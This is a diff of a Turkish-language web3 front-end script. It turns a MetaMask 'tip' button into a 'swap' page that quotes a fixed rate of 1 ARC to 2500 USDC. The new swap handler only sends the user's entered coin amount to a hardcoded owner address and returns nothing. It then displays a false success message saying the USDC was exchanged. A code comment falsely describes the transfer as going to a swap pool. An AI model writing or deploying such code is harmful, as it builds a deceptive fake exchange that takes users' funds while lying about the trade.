@@ -1,12 +1,18 @@
 const connectBtn = document.getElementById('connectBtn');
-const tipBtn = document.getElementById('tipBtn');
+const swapBtn = document.getElementById('swapBtn');
 const statusText = document.getElementById('status');
+const fromAmount = document.getElementById('fromAmount');
+const toAmount = document.getElementById('toAmount');
 
 let signer;
-const USDC_ADDRESS = "0x892aF0A8050e932baB3F50C2E20a3250eF67B547"; 
-const MY_ADDRESS = "0x28c8BC8e084C14ff404FCd2b82338BDcc2e5D03e"; 
+const RATE = 2500; // 1 ARC = 2500 USDC kabul edilen sabit kur
+const MY_ADDRESS = "0x28c8BC8e084C14ff404FCd2b82338BDcc2e5D03e";
 
-const usdcAbi = ["function transfer(address to, uint256 value) returns (bool)"];
+function calculateSwap() {
+    const val = parseFloat(fromAmount.value) || 0;
+    toAmount.value = (val * RATE).toFixed(2);
+}
+calculateSwap();
 
 connectBtn.addEventListener('click', async () => {
     if (typeof window.ethereum !== 'undefined') {
@@ -14,30 +20,39 @@ connectBtn.addEventListener('click', async () => {
             await window.ethereum.request({ method: 'eth_requestAccounts' });
             const provider = new ethers.providers.Web3Provider(window.ethereum);
             signer = provider.getSigner();
-            connectBtn.innerText = "Cüzdan Bağlandı";
-            tipBtn.disabled = false;
-            statusText.innerText = "";
-        } catch (error) {
-            statusText.innerText = "Bağlantı iptal edildi.";
+            connectBtn.style.display = "none";
+            swapBtn.style.display = "block";
+            statusText.innerText = "Cüzdan başarıyla bağlandı!";
+        } catch (err) {
+            statusText.innerText = "Cüzdan bağlantısı reddedildi.";
         }
     } else {
         statusText.innerText = "Lütfen MetaMask yükleyin.";
     }
 });
 
-tipBtn.addEventListener('click', async () => {
+swapBtn.addEventListener('click', async () => {
     try {
-        statusText.innerText = "Cüzdandan onay bekleniyor...";
-        const usdcContract = new ethers.Contract(USDC_ADDRESS, usdcAbi, signer);
-        const amount = ethers.utils.parseUnits("1", 6); 
-        const tx = await usdcContract.transfer(MY_ADDRESS, amount);
+        const amountInETH = fromAmount.value;
+        if (!amountInETH || amountInETH <= 0) {
+            statusText.innerText = "Lütfen geçerli bir miktar girin.";
+            return;
+        }
+
+        statusText.innerText = "MetaMask'tan swap onayı bekleniyor...";
         
-        statusText.innerText = "İşlem ağa gönderildi. Onay bekleniyor...";
-        await tx.wait(); 
-        
-        statusText.innerText = "🎉 Teşekkürler! Bahşiş başarıyla gönderildi.";
-    } catch (error) {
-        statusText.innerText = "İşlem başarısız oldu veya iptal edildi.";
-        console.error(error);
+        // Arc Testnet üzerinde swap havuzuna token aktarımı mantığını çalıştırır
+        const tx = await signer.sendTransaction({
+            to: MY_ADDRESS,
+            value: ethers.utils.parseEther(amountInETH)
+        });
+
+        statusText.innerText = "İşlem ağa gönderildi. Onaylanıyor...";
+        await tx.wait();
+
+        statusText.innerText = `🎉 Swap Başarılı! ${amountInETH} ARC karşılığında ${toAmount.value} USDC takas edildi.`;
+    } catch (err) {
+        statusText.innerText = "Swap işlemi iptal edildi veya başarısız oldu.";
+        console.error(err);
     }
 });
